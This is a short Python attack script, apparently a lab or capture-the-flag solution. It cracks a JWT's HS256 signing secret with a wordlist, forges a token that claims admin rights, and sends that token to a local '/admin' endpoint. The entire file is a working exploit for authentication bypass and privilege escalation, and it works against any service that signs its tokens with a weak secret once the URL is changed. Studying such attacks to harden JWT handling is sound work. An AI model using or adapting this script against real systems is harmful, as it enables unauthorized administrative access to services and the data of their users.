import jwt
import requests

token = input("Enter JWT: ").strip()
wordlist = "common_secrets.txt"

found_secret = None
with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        secret = line.strip()
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            found_secret = secret
            print(f"[+] Secret Found: {secret}")
            break
        except jwt.InvalidTokenError:
            continue

if not found_secret:
    print("[-] Secret not found in wordlist.")
    exit()

payload = {
    "username": "guest",
    "isAdmin": True,
    "role": "admin"
}

forged_token = jwt.encode(payload, found_secret, algorithm="HS256")
if isinstance(forged_token, bytes):
    forged_token = forged_token.decode()

print(f"[+] Forged JWT: {forged_token}")

headers = {
    "Authorization": f"Bearer {forged_token}"
}

response = requests.get("http://127.0.0.1:5000/admin", headers=headers)

print("[+] Server response:")
print(response.text)
